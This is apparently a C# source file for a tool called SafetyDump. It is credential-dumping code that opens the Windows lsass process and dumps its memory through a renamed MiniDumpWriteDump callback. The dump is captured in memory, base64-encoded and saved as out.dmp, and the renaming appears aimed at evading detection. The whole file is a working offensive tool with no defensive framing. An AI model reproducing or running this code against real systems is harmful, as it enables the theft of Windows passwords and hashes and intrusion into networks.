using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Linq.Expressions;
using System.IO;

namespace SafetyDump
{
    public class Program
    {

        private static void DMPMin(int pid = -1)
        {
            IntPtr targetProcessHandle;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                var processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
                    return;
                }
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception e)
            {
                Console.WriteLine($"\n[-] Error getting handle to {targetProcess.ProcessName} ({targetProcess.Id}):\n");
                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
                return;
            }

            try
            { 


                var byteArray = new byte[60 * 1024 * 1024];
                var callbackPtr = new Internals.DMPMinCallbackRoutine((param, input, output) =>
                {
                    var inputStruct = Marshal.PtrToStructure<Internals.DMPMin_CALLBACK_INPUT>(input);
                    var outputStruct = Marshal.PtrToStructure<Internals.DMPMin_CALLBACK_OUTPUT>(output);
                    switch (inputStruct.CallbackType)
                    {
                        case Internals.DMPMin_CALLBACK_TYPE.IoStartCallback:
                            outputStruct.status = Internals.HRESULT.S_FALSE;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case Internals.DMPMin_CALLBACK_TYPE.IoWriteAllCallback:
                            var ioStruct = inputStruct.Io;
                            if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
                            {
                                Array.Resize(ref byteArray, byteArray.Length * 2);
                            }
                            Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
                            outputStruct.status = Internals.HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case Internals.DMPMin_CALLBACK_TYPE.IoFinishCallback:
                            outputStruct.status = Internals.HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        default:
                            return true;
                    }
                });

                var callbackInfo = new Internals.DMPMin_CALLBACK_INFORMATION
                {
                    CallbackRoutine = callbackPtr, CallbackParam = IntPtr.Zero
                };

                var size = Marshal.SizeOf(callbackInfo);
                var callbackInfoPtr = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);

                if (Internals.DMPMinWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero, (uint)2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
                {
                    //Console.OutputEncoding = Encoding.UTF8;
                    string fileName = "out.dmp";
                    string destPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory,fileName);
                    File.WriteAllText(destPath, Convert.ToBase64String((byteArray)));
                    return;

                }
                Console.WriteLine("[-] Dump failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
            }
            catch  (Exception e)
            {
                Console.WriteLine("[-] Exception dumping process memory");
                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
            }

        }
    
        public static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                DMPMin();
            }
            else
            {
                var pid = -1;
                try
                {
                    pid = Convert.ToInt32(args[0]);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-] Error converting argument ({args[0]}) to PID: {e.Message}");
                    return;
                }
                DMPMin(pid);
            }
        }
    }
}